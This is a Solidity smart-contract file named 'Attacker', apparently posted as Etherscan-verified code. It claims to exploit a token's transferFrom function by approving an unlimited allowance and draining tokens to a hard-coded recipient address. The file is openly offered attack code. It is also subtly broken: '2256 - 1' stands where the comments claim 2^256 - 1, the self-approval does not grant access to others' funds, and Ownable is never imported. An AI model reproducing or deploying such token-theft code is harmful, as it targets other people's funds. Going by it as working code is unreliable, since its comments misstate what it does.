/**
 *Submitted for verification at Etherscan.io on 2017-11-28
*/

pragma solidity ^0.4.16;



import "./BasicToken.sol";



/*
 * @title Attacker
 * @dev Attacker contract that exploits the transferFrom function of the BasicToken contract
 */
contract Attacker is Ownable {
    // Address of the BasicToken contract
    address public basicTokenAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;


    // Function that calls the approve function of the BasicToken contract to allow an unlimited transfer of tokens
    function approve() public payable {
        // Get the BasicToken contract instance
        StandardToken basicToken = StandardToken(basicTokenAddress);

        // Call the approve function with a value of 2^256 - 1, allowing an unlimited transfer of tokens
        basicToken.approve(address(this), 2256 - 1);
    }

    // Function that calls the transferFrom function of the BasicToken contract to transfer an unlimited amount of tokens
    function exploit() public payable {
        // Get the BasicToken contract instance
        StandardToken basicToken = StandardToken(basicTokenAddress);

        // Recipient address
        address recipient = 0xCf361346A41A4F8AFd8Cc9EA568dB98e308488B5;

        // Call the transferFrom function with a value of 2^256 - 1, transferring an unlimited amount of tokens
        basicToken.transferFrom(msg.sender, recipient, 2256 - 1);
    }
}